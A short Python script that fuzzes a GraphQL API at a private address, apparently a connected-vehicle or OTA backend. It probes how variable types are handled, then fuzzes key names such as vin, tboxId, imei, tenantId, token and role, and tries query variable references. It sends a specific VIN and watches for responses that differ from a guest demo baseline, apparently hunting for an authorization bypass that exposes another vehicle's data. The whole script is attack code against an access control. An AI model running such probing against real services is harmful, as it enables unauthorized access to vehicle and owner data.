import requests, itertools
URL="http://10.225.139.2:8080/graphql"
BASE='{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'
VIN="CV622697F82A936A1"
def post(body):
    r=requests.post(URL,json=body,timeout=5); return r

# 1. type inference for variables
shapes=[("string","x"),("number",1),("bool",True),("array",[1]),("empty_obj",{}),
        ("obj_str",{"a":"b"}),("obj_obj",{"a":{"b":1}}),("obj_arr",{"a":[1]}),("null",None)]
print("=== variables type oracle ===")
for name,v in shapes:
    r=post({"variables":v})
    print(f"{name:10s} {r.status_code} {r.text[:60]}")

# 2. key fuzz on variables
keys="""vin vinNumber vehicleVin VIN id vehicleId vehicle_id vins vehicles sn key uuid number
campaign campaignId package packageId ota otaId firmware artifact resource device deviceId
tboxId tbox imei iccid msisdn plate target targetVin current currentVin query name code
tenant tenantId fleet fleetId user userId token session role scope""".split()
diffs=0
print("=== variables key fuzz ===")
for k in keys:
    for val in [VIN, [VIN], {"vin":VIN}]:
        try:
            r=post({"query":"{vehicles{vin label}}","variables":{k:val}})
            if r.text.strip()!=BASE:
                print("DIFF",k,val,r.status_code,r.text[:200],flush=True); diffs+=1
        except Exception: pass
print("key diffs",diffs)

# 3. variable references in query
print("=== query var refs ===")
names=["vin","id","vehicleId","v","VIN","vinNumber","target","targetVin","vehicleVin","input"]
for n in names:
    q=f'query(${n}: String!) {{ vehicle(vin: ${n}) {{ vin label }} }}'
    r=post({"query":q,"variables":{n:VIN}})
    if r.text.strip()!=BASE: print("DIFF ref",n,r.status_code,r.text[:200])
    q2=f'query(${n}: String!) {{ vehicles(vin: ${n}) {{ vin label }} }}'
    r=post({"query":q2,"variables":{n:VIN}})
    if r.text.strip()!=BASE: print("DIFF ref2",n,r.status_code,r.text[:200])
print("done")
